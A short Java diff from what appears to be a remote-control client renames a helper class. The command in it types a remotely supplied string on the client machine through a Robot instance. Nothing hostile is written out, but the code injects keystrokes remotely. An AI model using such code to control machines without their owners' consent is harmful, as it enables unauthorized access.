@@ -4,7 +4,7 @@ package br.com.introcdc.connect.client.commands.control;
  */
 
 import br.com.introcdc.connect.client.command.ClientCommand;
-import br.com.introcdc.connect.client.components.ControlComponents;
+import br.com.introcdc.connect.client.components.ClientControlComponents;
 
 public class ClientCommandKeyboardType extends ClientCommand {
 
@@ -19,7 +19,7 @@ public class ClientCommandKeyboardType extends ClientCommand {
             return;
         }
         msg("Digitando " + input);
-        new Thread(() -> ControlComponents.typeString(ControlComponents.ROBOT_INSTANCE, input)).start();
+        new Thread(() -> ClientControlComponents.typeString(ClientControlComponents.ROBOT_INSTANCE, input)).start();
     }
 
 }
